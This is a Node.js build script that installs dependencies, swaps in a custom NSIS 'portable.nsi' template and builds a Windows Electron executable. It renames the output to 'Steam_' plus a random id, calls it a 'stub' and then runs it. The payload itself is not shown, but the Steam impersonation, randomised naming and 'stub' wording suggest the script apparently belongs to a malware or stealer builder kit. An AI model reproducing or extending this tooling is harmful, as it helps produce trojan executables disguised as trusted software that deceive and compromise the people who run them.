const fs = require('fs').promises;
const path = require('path');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

async function makeid_var(length) {
    let result = '';
    const characters = 'abcdefghijklmnopqrstuvwxyz1234567890';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

async function main() {
    const CURRENT_DIR = process.cwd();
    const start = Date.now();

    try {
        console.log('Installing dependencies...');
        await exec('npm i');

        const oldNsiPath = path.join(process.cwd(), 'node_modules', 'app-builder-lib', 'templates', 'nsis', 'portable.nsi');
        try {
            await fs.unlink(oldNsiPath);
            console.log('Successfully deleted old portable.nsi.');
        } catch (error) {
            if (error.code !== 'ENOENT') {
                console.error('Error deleting old portable.nsi:', error.message);
            } else {
                console.log('Old portable.nsi does not exist. Skipping deletion.');
            }
        }

        const newNsiPath = path.join(process.cwd(), 'portable.nsi');
        await fs.copyFile(newNsiPath, oldNsiPath);
        console.log('Copied new portable.nsi.');

        console.log('Build Start...');

        const randomid = await makeid_var(8);

        const { stdout, stderr } = await exec('call npm run electron-builder --win');

        if (stderr) {
            console.error('Compilation failed!', stderr);
            await exec(`call msg * "Compilation failed!${stderr ? '\\n' + stderr : ''}"`);
        } else {
            console.log('Compilation success!');

            const outputFilename = `Steam_${randomid}.exe`;
            const oldFilePath = path.join(CURRENT_DIR, 'build', 'Steam 1.0.0.exe');
            const newFilePath = path.join(CURRENT_DIR, 'build', outputFilename);
            await fs.rename(oldFilePath, newFilePath);

            console.log(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
            await exec(`call msg * "Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}"`);
            await exec(`call start explorer "${path.join(CURRENT_DIR, 'build')}"`);
	    await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
        }

    } catch (error) {
        console.error('Error:', error.message);
    }

    console.log('Use main/fix.bat and press any key to continue...');
}

main();
